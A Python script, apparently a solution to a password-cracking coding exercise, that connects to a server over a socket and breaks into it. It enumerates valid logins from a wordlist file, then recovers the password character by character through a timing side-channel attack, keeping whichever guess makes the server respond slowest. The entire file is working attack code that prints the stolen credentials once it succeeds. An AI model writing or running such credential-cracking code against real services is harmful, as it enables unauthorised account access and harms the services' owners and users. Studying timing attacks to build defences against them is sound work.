import socket
import sys
import json
import time

ip = sys.argv[1]
port = int(sys.argv[2])

client_socket = socket.socket()
client_socket.connect((ip, port))

# ---- LOAD LOGINS WITH YOUR EXACT PATH ----
with open(r"C:\Users\alexl_wcbsfpg\Downloads\logins.txt", "r") as f:
    logins = [line.strip() for line in f]

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# ---- STEP 1: FIND LOGIN ----
correct_login = None

for login in logins:
    data = {"login": login, "password": " "}
    client_socket.send(json.dumps(data).encode())
    response = json.loads(client_socket.recv(1024).decode())

    if response["result"] != "Wrong login!":
        correct_login = login
        break

# ---- STEP 2: TIMING ATTACK FOR PASSWORD ----
password = ""

while True:
    best_char = None
    longest_time = 0

    for c in chars:
        attempt = password + c
        data = {"login": correct_login, "password": attempt}

        start = time.perf_counter()
        client_socket.send(json.dumps(data).encode())
        response = json.loads(client_socket.recv(1024).decode())
        end = time.perf_counter()

        elapsed = end - start

        if response["result"] == "Connection success!":
            password = attempt
            print(json.dumps({"login": correct_login, "password": password}))
            client_socket.close()
            exit()

        if elapsed > longest_time:
            longest_time = elapsed
            best_char = c

    password += best_char